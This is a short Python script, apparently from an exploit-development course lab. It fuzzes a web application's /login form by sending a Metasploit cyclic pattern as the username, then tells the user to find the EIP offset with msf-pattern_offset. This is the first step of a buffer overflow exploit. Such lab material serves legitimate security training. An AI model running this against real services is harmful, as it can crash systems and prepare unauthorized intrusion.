#!/usr/bin/env python3

import socket
import sys
import subprocess

if len(sys.argv) < 4:
    print("Usage: {} <IP> <PORT> <BUFFER_SIZE>".format(sys.argv[0]))
    print("Fuzzes the web-based application from Chapter 3.")
    exit(1)

try:
    server = sys.argv[1].encode()
    port = int(sys.argv[2])
    size = int(sys.argv[3])

    inputBuffer = bytes(subprocess.check_output(["/usr/bin/msf-pattern_create", "-l", str(size)]).strip())
    content = b"username=" + inputBuffer + b"&password=A"

    buffer = b"POST /login HTTP/1.1\r\n"
    buffer += b"Host: " + server + b"\r\n"
    buffer += b"User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
    buffer += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    buffer += b"Accept-Language: en-US,en;q=0.5\r\n"
    buffer += b"Referer: http://" + server + b"/login\r\n"
    buffer += b"Connection: close\r\n"
    buffer += b"Content-Type: application/x-www-form-urlencoded\r\n"
    buffer += b"Content-Length: " + str(len(content)).encode() + b"\r\n"
    buffer += b"\r\n"
    buffer += content

    print("Sending buffer...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(buffer)
    s.close()

    print("Done!")
    print("Run msf-pattern_offset -l {} -q <ASCII_CONTENT_OF_EIP>".format(str(size)))

except socket.error:
    print("Could not connect!")
